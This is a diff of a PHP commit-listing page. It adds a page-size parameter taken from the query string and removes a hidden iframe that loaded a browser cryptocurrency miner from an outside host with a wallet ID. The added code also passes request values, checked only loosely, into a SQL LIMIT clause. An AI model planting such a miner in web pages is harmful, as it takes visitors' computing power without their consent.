@@ -2,6 +2,15 @@
 require('opendb.php');
 $per_page = 50;
 
+if(is_numeric($_GET['show'])){
+	$per_page = $_GET['show'];
+}
+
+$page = 0;
+if(is_numeric($_GET['page'])){
+	$page = $_GET['page'];
+}
+
 function get_num_pages($per_page){
 	$query = "SELECT COUNT(*) FROM new_commits ORDER BY id DESC";
 	$result = mysql_query($query);
@@ -11,11 +20,6 @@ function get_num_pages($per_page){
 }
 
 $num_pages = get_num_pages($per_page);
-
-$page = 0;
-if(is_numeric($_GET['page'])){
-	$page = $_GET['page'];
-} 
 
 // Get commits
 $query = "SELECT * FROM new_commits ORDER BY date DESC LIMIT " . $page * $per_page . ", " . $per_page;
@@ -107,6 +111,5 @@ Watch the <a href="http://bit.ly/19XjyNb">video</a>!
 	}
 	?>
 </div>
-<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 14FpXKYtUkQi9G5Ruj5PZibh1e3DtiHUme</script></iframe>
 </body>
 </html>
